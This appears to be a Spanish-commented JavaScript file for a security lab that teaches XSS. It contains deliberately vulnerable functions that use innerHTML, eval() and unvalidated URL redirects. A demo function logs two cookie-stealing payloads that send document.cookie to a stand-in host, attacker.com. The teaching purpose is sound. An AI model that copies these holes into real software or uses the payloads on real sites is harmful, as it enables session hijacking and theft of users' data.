/**
 * =====================================================
 * JAVASCRIPT DEL LABORATORIO DE SEGURIDAD
 * =====================================================
 * 
 * Este archivo contiene código que puede ser vulnerable
 * a diversos ataques XSS.
 * 
 * VULNERABILIDADES PRESENTES:
 * - Inyección de código via innerHTML sin sanitizar
 * - Uso de eval() (potencialmente peligroso)
 * - No hay validación CSP
 * =====================================================
 */

// =====================================================
// EJEMPLO 1: innerHTML sin sanitizar
// =====================================================
// Esta función inserta contenido HTML sin validación.
// Si el contenido viene del usuario, es vulnerable a XSS.
function displayComment(comment) {
    document.getElementById('comments-container').innerHTML += 
        '<div class="comment">' + comment + '</div>';
}

// =====================================================
// EJEMPLO 2: Uso de eval() (NO USAR EN PRODUCCIÓN)
// =====================================================
// eval() ejecuta código JavaScript desde strings.
// Es EXTREMADAMENTE peligroso si el input viene del usuario.
function executeUserCode(code) {
    // ¡ESTO ES MUY PELIGROSO!
    eval(code);
}

// =====================================================
// EJEMPLO 3: URL parsing sin validación
// =====================================================
// Parsing de URLs sin sanitización puede permitir
// javascript: URLs maliciosas.
function handleLinkClick(url) {
    window.location.href = url;
}

// =====================================================
// EJEMPLO 4: Almacenamiento en localStorage (XSS Persistente)
// =====================================================
// Si un atacante puede injectar script via XSS, puede
// robar datos del localStorage.
function saveUserData(key, value) {
    localStorage.setItem(key, value);
}

function getUserData(key) {
    return localStorage.getItem(key);
}

// =====================================================
// FUNCIÓN DE DEMOSTRACIÓN DE XSS
// =====================================================
// Esta función simula cómo un atacante podría usar XSS
// para robar cookies de sesión.
function demonstrateXSS() {
    // Payload típico de robo de cookies:
    const maliciousPayload = `
        <script>
            // Robar cookies y enviarlas a un servidor externo
            fetch('http://attacker.com/steal?cookie=' + document.cookie);
        </script>
    `;
    
    // También se puede usar con eventos HTML:
    const imgOnerror = `
        <img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">
    `;
    
    console.log('Payloads de demostración XSS:');
    console.log(maliciousPayload);
    console.log(imgOnerror);
}

// =====================================================
// DEMOSTRACIÓN DE SESSION HIJACKING
// =====================================================
// Un script inyectado via XSS podría hacer esto:
// 1. Leer document.cookie
// 2. Enviarlo a un servidor externo
// 3. El atacante usa la cookie para impersonar al usuario
function stealSessionDemo() {
    // En una página vulnerable, esto filtraría la cookie:
    console.log('Cookies actuales:', document.cookie);
    
    // En producción con HttpOnly, las cookies de sesión
    // no serían accesibles via JavaScript.
}

// Inicialización
document.addEventListener('DOMContentLoaded', function() {
    console.log('Laboratorio de Seguridad - JavaScript cargado');
    console.log('Demostrando vulnerabilidades potenciales...');
});
